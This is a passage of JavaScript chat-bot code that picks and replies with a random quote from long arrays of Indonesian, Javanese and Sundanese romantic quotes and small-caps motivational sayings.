            "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
            "Pacar orang adalah jodoh kita yang tertunda.",
            "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
            "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
            "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
            "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
            "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
            "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
            "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
            "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
            "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
            "Aku ingin menjadi satu-satunya, bukan salah satunya.",
            "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
            "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
            "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
            "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
            "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
            "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
            "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
            "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
            "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
            "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
            "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
            "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
            "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
            "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
            "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
            "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
            "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
            "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
            "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
            "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
            "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
            "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
            "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
            "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
            "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
            "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
            "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
            "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
            "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
            "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
            "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
            "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
            "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
            "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
            "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
            "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
            "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
            "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
            "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
            "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
            "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
            "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
            "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
            "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
            "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
            "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
            "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
            "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
            "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
            "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
            "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
            "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
            "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
            "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
            "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
            "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
            "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
            "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
            "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
            "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
            "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
            "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
            "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
            "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
            "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
            "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
            "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
            "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
            "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
            "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
            "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
            "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
            "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
            "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
            "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
            "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
            "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
            "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
            "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
            "Saben dino kegowo ngimpi tapi ora biso nduweni.",
            "Ora ketemu koe 30 dino rasane koyo sewulan.",
            "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
            "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
            "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
            "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
            "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
            "Kanyaah akang moal luntur najan make Bayclean.",
            "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
            "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
            "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
            "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
            "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
            "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
            "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
            "Cukup jaringan aja yang hilang, kamu jangan.",
            "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
            "Musuhku adalah mereka yang ingin memilikimu juga.",
            "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
            "Jam tidurku hancur dirusak rindu.",
            "Cukup China aja yang jauh, cinta kita jangan.",
            "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
            "Cuma satu keinginanku, dicintai olehmu..",
            "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
            "Cukup antartika aja yang jauh. Antarkita jangan.",
          ];
          const Kilianhsttruth =
            bucin[Math.floor(Math.random() * bucin.length)];
          reply(`${Kilianhsttruth}`);
        }
        break;

      case "quotesmotivasi":
        {
          function pickRandom(list) {
            return list[Math.floor(list.length * Math.random())];
          }

          const motivasi = [
            "ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
            "ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
            "ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
            "ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
            "ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
            "ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
            "ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
            "ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
            "ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
            "ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
            "ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
            "ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
            "ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
            "ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
            "ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
            "ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
            "ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
            "ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
            "ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
            "ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
            "ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
            "ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
            "ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
            "ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
            "ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
            "ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
            "ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
            "20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
            "ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
            "ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
            "ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
            "ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
            "ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
            "ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
            "ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
            "ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
            "ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
            "ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
